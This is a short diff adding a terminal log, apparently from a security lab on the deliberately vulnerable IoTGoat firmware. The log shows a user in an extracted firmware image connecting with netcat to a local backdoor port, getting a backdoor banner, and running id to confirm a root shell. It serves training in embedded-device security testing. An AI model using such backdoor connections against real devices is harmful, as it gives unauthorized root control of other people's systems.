@@ -1,0 +1,4 @@
+kanghyun@kanghyun-VirtualBox:~/iotgoat/_IoTGoat-raspberry-pi2.img.extracted/squashfs-root$ nc 127.0.0.1 5515
+[***]Successfully Connected to IoTGoat's Backdoor[***]
+id
+uid=0(root) gid=0(root) groups=0(root)
